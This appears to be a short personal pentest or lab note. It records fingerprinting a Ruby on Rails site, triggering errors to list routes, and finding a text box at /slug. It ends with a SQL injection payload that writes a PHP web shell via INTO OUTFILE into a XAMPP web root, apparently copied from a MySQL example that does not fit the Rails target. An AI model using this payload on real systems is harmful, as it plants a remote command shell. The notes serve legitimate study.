
Using Wappalyzer, we see Rub on Rails in Web frameworks.

![[Pasted image 20221108121650.png]]

Reviewing the url, we manipulate the path to spawn an error.

http://$TARGET/users/

http://$TARGET/x/

![[Pasted image 20221108121711.png]]

We now have a list of Paths for us to try.

Visting /slug, we get a text box.

[[1.2_MySQL#Using INTO OUTFILE to create a malicious PHP file:]] EXAMPLE 3


```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -' 
```
